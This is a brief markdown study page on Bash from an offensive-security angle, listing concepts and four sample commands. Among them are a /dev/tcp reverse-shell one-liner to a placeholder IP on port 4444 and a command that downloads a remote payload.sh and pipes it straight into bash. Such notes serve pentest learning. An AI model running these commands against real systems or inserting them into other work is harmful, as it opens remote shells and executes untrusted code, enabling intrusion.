# Bash

Covers command-line usage and scripting from a cybersecurity perspective, including command chaining, automation, reverse shells, and payload execution. Focuses on how attackers and pentesters use Bash for reconnaissance, enumeration, and quick exploit execution.

**Purpose**: To improve efficiency in real-world engagements by automating tasks, reducing manual effort, and enabling faster interaction with target systems.

---

## Key Concepts

- Command Chaining
- Automation
- Reverse Shells
- Payload Execution
- Reconnaissance
- Enumeration
- Exploitation
- Reporting

---

## Examples

```bash
# Command Chaining
ls -la | grep .env

# Automation
for i in $(seq 1 10); do curl -s http://[IP_ADDRESS]/$i | grep -q "success" && echo "Success on $i"; done

# Reverse Shell
bash -i >& /dev/tcp/[IP_ADDRESS]/4444 0>&1

# Payload Execution
curl -s http://[IP_ADDRESS]/payload.sh | bash
```
---
